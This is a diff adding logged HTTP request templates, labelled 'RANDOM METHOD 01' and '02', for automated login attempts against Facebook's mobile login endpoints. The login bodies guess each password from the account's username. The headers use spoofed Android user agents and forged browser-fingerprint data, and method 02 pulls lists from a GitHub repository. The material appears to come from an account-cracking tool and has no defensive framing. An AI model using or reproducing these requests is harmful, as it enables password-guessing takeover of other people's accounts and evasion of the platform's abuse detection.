@@ -13,3 +13,49 @@ TANIM URL : https://touch.prod.facebook.com/login/?next&ref=dbl&fl&login_from_ay
  TANIM HEADERS : {'Host': 'touch.prod.facebook.com', 'method': 'GET', 'scheme': 'https', 'authority': 'touch.prod.facebook.com', 'x-fb-rlafr': '0', 'access-control-allow-origin': '*', 'facebook-api-version': 'v17.0', 'strict-transport-security': 'max-age=15552000', 'pragma': 'no-cache', 'cache-control': 'max-age=0', 'x-fb-request-id': 'A5ZKh_85GaagpB8XJbwc9jD', 'x-fb-trace-id': 'DKv719n6x5A', 'x-fb-rev': '1007660106', 'x-fb-debug': '0Wgri/aCTmjxPumj0+CG/zZiMXJ7STJoeBV090VKxpelr/8ZFdv2Yhf8eVXye88jFgf4VfRJ/fAhAmK5VclVPQ==', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'origin': 'https://touch.prod.facebook.com', 'referer': 'https://touch.prod.facebook.com/', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"', 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '"13.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 4; 21061119AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4437.120 Mobile Safari/537.36'}
 
 
+
+RANDOM METHOD 01>>>
+
+TANIM URL : https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8
+--------------------------------------------------
+ TANIM DATA : None
+--------------------------------------------------
+ TANIM HEADERS : None
+--------------------------------------------------
+
+ TANIM URL : https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100
+--------------------------------------------------
+ TANIM DATA : {'m_ts': '1728459242', 'li': '6jEGZ4rawhDjQB0mzyOgL9kw', 'try_number': 0, 'unrecognized_tries': 0, 'email': 'abal591493', 'prefill_contact_point': 'abal591493 abal59', 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': True, 'had_password_prefilled': True, 'is_smart_lock': False, 'bi_xrwh': 0, 'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}', 'encpass': '#PWD_BROWSER:0:1728459242:abal59', 'jazoest': '2964', 'lsd': 'AVqyOVW12uo'}
+--------------------------------------------------
+ TANIM HEADERS : {'Host': 'x.prod.facebook.com', 'method': 'GET', 'scheme': 'https', 'x-fb-rlafr': '0', 'access-control-allow-origin': '*', 'facebook-api-version': 'v17.0', 'strict-transport-security': 'max-age=15552000', 'pragma': 'no-cache', 'cache-control': 'max-age=0', 'x-fb-request-id': 'A5ZKh_85GaagpB8XJbwc9jD', 'x-fb-trace-id': 'DKv719n6x5A', 'x-fb-rev': '1007660106', 'x-fb-debug': '0Wgri/aCTmjxPumj0+CG/zZiMXJ7STJoeBV090VKxpelr/8ZFdv2Yhf8eVXye88jFgf4VfRJ/fAhAmK5VclVPQ==', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'origin': 'https://x.prod.facebook.com', 'referer': 'https://x.prod.facebook.com/', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"', 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '"13.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; X27Pro Build/PKQ1.192103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.6252.20 Mobile Safari/537.36'}
+
+RANDOM METHOD 02>>> 
+
+TANIM URL : https://raw.githubusercontent.com/ARAFAT-FUCKER/semx/refs/heads/main/hu.txt
+--------------------------------------------------
+ TANIM DATA : None
+--------------------------------------------------
+ TANIM HEADERS : None
+--------------------------------------------------
+
+ TANIM URL : https://x.prod.facebook.com/
+--------------------------------------------------
+ TANIM DATA : None
+--------------------------------------------------
+ TANIM HEADERS : None
+--------------------------------------------------
+
+ TANIM URL : https://raw.githubusercontent.com/ARAFAT-FUCKER/semx/refs/heads/main/mdl1.txt
+--------------------------------------------------
+ TANIM DATA : None
+--------------------------------------------------
+ TANIM HEADERS : None
+--------------------------------------------------
+
+ TANIM URL : https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100
+--------------------------------------------------
+ TANIM DATA : {'m_ts': '1728459353', 'li': 'WTIGZ_oa63admydDnHD4I7y0', 'try_number': 0, 'unrecognized_tries': 0, 'email': 'abal556495', 'prefill_contact_point': 'abal556495 abal55', 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': True, 'had_password_prefilled': True, 'is_smart_lock': False, 'bi_xrwh': 0, 'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}', 'encpass': '#PWD_BROWSER:0:1728459354:abal55', 'jazoest': '2892', 'lsd': 'AVp9h2aYK6g'}
+--------------------------------------------------
+ TANIM HEADERS : {'Host': 'x.prod.facebook.com', 'content-length': '18', 'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"', 'sec-ch-ua-mobile': '?1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-Z130H Build/RP1A.174868.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.1526.26 Mobile Safari/537.36', 'x-response-format': 'JSONStream', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-lsd': 'AVo_Z7twFKE', 'viewport-width': '360', 'sec-ch-ua-platform-version': '""', 'x-requested-with': 'XMLHttpRequest', 'x-asbd-id': '129477', 'dpr': '2', 'sec-ch-ua-full-version-list': '', 'sec-ch-ua-model': '""', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua-platform': '"Android"', 'accept': '*/*', 'origin': 'https://x.prod.facebook.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://x.prod.facebook.com/', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
+--------------------------------------------------
+
